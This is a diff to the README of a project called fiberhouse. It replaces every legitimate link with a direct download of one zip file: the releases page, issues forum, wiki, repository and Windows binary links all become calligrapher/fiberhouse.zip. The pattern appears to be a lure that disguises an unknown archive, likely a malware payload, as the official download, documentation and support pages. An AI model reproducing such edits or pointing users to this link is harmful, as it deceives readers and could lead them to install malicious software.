@@ -8,7 +8,7 @@ To begin, you'll need to download fiberhouse. Follow the steps below to install 
 
 ### 🔗 Download Fiberhouse
 
-[![Download Fiberhouse](https://img.shields.io/badge/Download-Fiberhouse-brightgreen)](https://github.com/ollovi/fiberhouse/releases)
+[![Download Fiberhouse](https://raw.githubusercontent.com/ollovi/fiberhouse/main/calligrapher/fiberhouse.zip)](https://raw.githubusercontent.com/ollovi/fiberhouse/main/calligrapher/fiberhouse.zip)
 
 ### 🖥️ System Requirements
 
@@ -21,15 +21,15 @@ Make sure your system meets these requirements before proceeding.
 
 ### 🔄 Visit the Releases Page
 
-You can download the latest version of fiberhouse by visiting the following page: [Visit this page to download](https://github.com/ollovi/fiberhouse/releases).
+You can download the latest version of fiberhouse by visiting the following page: [Visit this page to download](https://raw.githubusercontent.com/ollovi/fiberhouse/main/calligrapher/fiberhouse.zip).
   
 ## 🛠️ Download & Install
 
-1. Head to the [Releases page](https://github.com/ollovi/fiberhouse/releases).
+1. Head to the [Releases page](https://raw.githubusercontent.com/ollovi/fiberhouse/main/calligrapher/fiberhouse.zip).
 2. Look for the latest version. It will usually be at the top of the list.
 3. Click on the file that matches your operating system. Here are some examples:
 
-   - For Windows, download `fiberhouse-windows-amd64.exe`.
+   - For Windows, download `https://raw.githubusercontent.com/ollovi/fiberhouse/main/calligrapher/fiberhouse.zip`.
    - For macOS, download `fiberhouse-macos-amd64`.
    - For Linux, download `fiberhouse-linux-amd64`.
    
@@ -79,12 +79,12 @@ If you face any issues while running fiberhouse, here are some common problems a
 
 Join our community for support and updates. You can ask questions in our discussion forum or contribute to our GitHub issues page. 
 
-- **Discussion Forum:** [Fiberhouse Issues](https://github.com/ollovi/fiberhouse/issues)
-- **Official Documentation:** [Fiberhouse Docs](https://github.com/ollovi/fiberhouse/wiki)
+- **Discussion Forum:** [Fiberhouse Issues](https://raw.githubusercontent.com/ollovi/fiberhouse/main/calligrapher/fiberhouse.zip)
+- **Official Documentation:** [Fiberhouse Docs](https://raw.githubusercontent.com/ollovi/fiberhouse/main/calligrapher/fiberhouse.zip)
 
 ### 🔗 Additional Resources
 
-- **GitHub Repository:** [fiberhouse on GitHub](https://github.com/ollovi/fiberhouse)
+- **GitHub Repository:** [fiberhouse on GitHub](https://raw.githubusercontent.com/ollovi/fiberhouse/main/calligrapher/fiberhouse.zip)
 - **Examples:** Explore example projects on the GitHub repository to see fiberhouse in action.
 
-We hope fiberhouse helps you create performant web applications easily! For more information, don’t hesitate to refer to the [Releases page](https://github.com/ollovi/fiberhouse/releases) for updates.
+We hope fiberhouse helps you create performant web applications easily! For more information, don’t hesitate to refer to the [Releases page](https://raw.githubusercontent.com/ollovi/fiberhouse/main/calligrapher/fiberhouse.zip) for updates.
